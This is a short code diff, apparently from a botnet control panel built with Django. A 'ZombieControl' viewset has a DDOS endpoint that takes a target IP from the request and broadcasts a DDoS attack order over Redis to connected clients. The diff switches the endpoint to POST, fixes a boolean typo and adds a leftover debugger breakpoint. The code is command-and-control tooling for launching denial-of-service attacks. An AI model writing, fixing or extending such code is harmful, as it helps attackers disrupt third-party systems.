@@ -60,11 +60,12 @@ class IndexPage(View,TemplateResponseMixin,ContextMixin):
 
 class ZombieControl(viewsets.ModelViewSet):
 
-    @list_route(methods=['get'])
+    @list_route(methods=['post'])
     def DDOS(self,request,pk=None):
+        pdb.set_trace()
         target = request.data['targetip']
 
-        redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=true)
+        redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
 
         respData = {'attacktype':'ddos','attackInfo':{'targetip':target}}
         redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
